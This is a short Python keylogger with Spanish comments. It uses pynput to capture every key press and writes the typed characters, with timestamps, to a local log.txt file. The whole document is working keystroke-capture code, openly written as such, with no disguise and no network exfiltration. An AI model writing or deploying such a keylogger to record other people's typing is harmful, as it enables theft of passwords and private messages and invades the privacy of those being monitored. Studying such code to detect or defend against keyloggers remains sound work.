from pynput.keyboard import Key, Listener
from datetime import datetime

log_filename = "log.txt"
current_text = [] 

# Función de fecha y hora
def iniciar_log():
    with open(log_filename, 'a') as logfile:
        logfile.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}:\n")

def presionar_tecla(key):
    global current_text

    if key == Key.space:
        current_text.append(" ")
        actualizar_log()  # Añadir un espacio sin saltar de línea
    elif key == Key.enter:
        guardar_texto_con_fecha()  # Guardar el texto acumulado y añadir fecha y hora
    elif key == Key.backspace:
        if current_text:
            current_text.pop()  # Borrar el último carácter
        actualizar_log(True)  # Actualizar después de borrar
    elif key == Key.esc:
        guardar_texto()  # Guardar lo que hay antes de salir
        return False  
    else:
        try:
            current_text.append(key.char)
            actualizar_log() 
        except AttributeError:
            pass  

# Guardar el texto acumulado en el archivo sin hacer un salto de línea
def guardar_texto():
    if current_text:  
        with open(log_filename, 'a') as logfile:
            logfile.write("".join(current_text))
        current_text.clear()  

# Guardar el texto con la fecha y hora al presionar Enter
def guardar_texto_con_fecha():
    if current_text:  
        with open(log_filename, 'a') as logfile:
            logfile.write("".join("\n"))  
        current_text.clear()  
    with open(log_filename, 'a') as logfile:
        logfile.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}:\n")

# Actualizar el archivo en tiempo real solo cuando se presiona una tecla
def actualizar_log(borrado=False):
    with open(log_filename, 'r+') as logfile:
        logfile.seek(0, 2)  # Mover al final
        if borrado:
            if logfile.tell() > 0:
                logfile.seek(logfile.tell() - 1) 
                logfile.truncate()  # Eliminar el último carácter
        else:
            if current_text: 
                logfile.write(current_text[-1])  

# Iniciar el listener
iniciar_log() 
with Listener(on_press=presionar_tecla) as listener:
    listener.join()
